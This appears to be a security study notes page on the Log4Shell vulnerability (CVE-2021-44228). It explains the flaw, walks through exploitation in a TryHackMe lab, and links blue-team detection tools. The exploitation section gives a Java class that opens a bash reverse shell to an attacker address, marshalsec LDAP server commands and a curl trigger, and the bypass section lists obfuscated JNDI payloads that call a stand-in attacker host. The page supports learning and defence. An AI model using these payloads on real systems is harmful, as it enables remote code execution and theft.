# Log4Shell
- [Critical RCE Vulnerability: log4j - CVE-2021-44228](https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java) by Huntress
- [Log4Shell Testter](https://log4shell.huntress.com/) by Huntress
- [Exploiting Log4Shell in Minecraft](https://www.youtube.com/watch?v=7qoPDq41xhQ) by John Hammond

> On December 9th, 2021, the world was made aware of a new vulnerability identified as CVE-2021-44228, affecting the Java logging package `log4j`. This vulnerability earned a severity score of 10.0 (the most critical designation) and offers remote code trivial remote code execution on hosts engaging with software that utilizes this `log4j` version. This attack has been dubbed "Log4Shell"

> Today, `log4j` version `2.16.0` is available and patches this vulnerability (JNDI is fully disabled, support for Message Lookups is removed, and the new DoS vulnerability CVE-2021-45046 is not present). [Patch release](https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.16.0)

> However, the sheer danger of this vulnerability is due to how ubiquitous the logging package is. Millions of applications as well as software providers use this package as a dependency in their own code. While you may be able to patch your own codebase using `log4j`, other vendors and manufacturers will still need to push their own security updates downstream. Many security researchers have likened this vulnerability to that of [Shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug)) by the nature of its enormous attack surface. We will see this vulnerability for years to come.

## Technical Summary
From an outside point of view, it is hard to pin point which data may be logged in a Java-based application. However below are some common places to enumerate for this vulnerability:
- Input boxes, user and password login forms, data entry points within applications
- HTTP headers such as `User-Agent`, `X-Forwarded-For`, or other customizable headers
- URL parameters
- **Any place for user-supplied data**

A typical payload syntax is:

<center>${jndi:ldap//ATTACKERHOST/ENDPOINT}</center>

This vulnerability leverages the loggers ability to parse entries within the block `${}` to enrich the data. This same feature can also be used to evaluate code based off the entry data. This creates an opening where one can invoke the **JNDI** functionality to "reference" an attacker controlled endpoint and execute commands. (Rather similar to Server Side Template Injection (SSTI) attacks)

Example attack chain:
1. Suppose that a certain web app that is vulnerable logs the `foo` parameter given to the web app: `https://example.com/page?foo=12`
2. An attacker can insert the payload to that parameter: `https://example.com/page?foo=${jndi:ldap//ATTACKERHOST/ENDPOINT}`
3. The logger will evaluate the given block which makes invoke the JNDI and reach out to the attacker's endpoint via the LDAP protocol (as in example, other protocols such as DNS, RMI have been observed in exploitation).
4. A malicious (LDAP) server will listen and redirect the request to malicious resource (a Java class) which is served at a different location.
5. The logger will then deserialize and load the malicious class into the application runtime and execute the instructions.

> [More about JNDI/LDAP Manipulation to RCE](Attachments/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf) - Black Hat USA 2016

## Exploitation
With reference to the above example, an attacker needs to set up 2 things to carry out this attack; one being a rogue LDAP referral server and a simple web directory serving malicious Java class files.

[marshalsec](https://github.com/mbechler/marshalsec) project can be used as a LDAP referral server for this proof-of-concept. This project was made to demonstrate similar unsafe object deserialization attacks in Java. Read the given paper in the repository to learn more.

First, a malicious Java class has to be made as below:

```java
// Exploit.java

public class Exploit {
    static {
        Process p;
        String cmd = "bash -c $@|bash 0 echo bash -i >& /dev/tcp/ATTACKER.IP.ADDRESS/PORT 0>&1"; // Bash reverse shell
        try {
            p = Runtime.getRuntime().exec(cmd);
            p.waitFor();
            p.destroy();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

This can be compiled with `javac Exploit.java` (`javac` is included in JDK) which will produce `Exploit.class`. (`javac` compile version and the target application runtime may not be compatible with each other, that's another factor to check in pentests or CTFs.) After that, this file has to be served over HTTP to referenced later.

After `marshalsec` has been built according to the instructions, start the LDAP server by executing:

```shell
# within project directory
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER.IP.ADDRESS:PORT/#Exploit"

# will return the listening port if successful
# Listening on 0.0.0.0:1389
```

Here the `#Exploit` is a direct reference to our malicious class name (as seen above). When successful, the server will print the listening port to the terminal.

Then, an attacker can spin up their reverse shell listener and finally execute the payload by inserting it to the discovered entry point (from the above example):

```shell
curl 'http://example.com/page?foo=$\{jndi:ldap://10.4.6.185:1389/Exploit\}'
```

Here `Exploit` endpoint is also a direct reference the class that is loaded and they can be modified accordingly. When successful, a reverse shell will be available as described in our example `Exploit` class above.

> This demo is available at [TryHackMe - Solar](https://tryhackme.com/room/solar)

In addition to this RCE, log4j exposes the system environment variables as well. An attacker leverage on this to uncover sensitive information in production such as access tokens. Due to how hard it is to detect exploitation and its **massive** attack surface, "Log4Shell" received the perfect 10/10 criticality score and caused a major disturbance in IT.

*TryHackMe Demo Room:*
![](Attachments/Pasted%20image%2020221126173925.png)

## Bypasses
Because this attack leverages `log4j`, the payload can ultimately access all of the same expansion, substitution, and templating tricks that the package makes available. This means that a threat actor could use any sort of tricks to hide, mask, or obfuscate the payload.

Examples:
- `${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}`
- `${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}`
- `${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}`
- `${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}`
- `${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}`
- `${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}`
- `${${::-j}ndi:rmi://attackerendpoint.com/}`

## For the Blue Team
- [https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes](https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes) (local, based off hashes of log4j JAR files)
- [https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d](https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d) (local, based off hashes of log4j CLASS files)
- [https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228](https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228) (listing of vulnerable JAR and CLASS hashes)
- [https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1](https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1) (local, hunting for vulnerable log4j packages in PowerShell)
- [https://github.com/darkarnium/CVE-2021-44228](https://github.com/darkarnium/CVE-2021-44228) (local, YARA rules)
- [r/SysAdmin - Log4Shell Mega Thread](https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/)

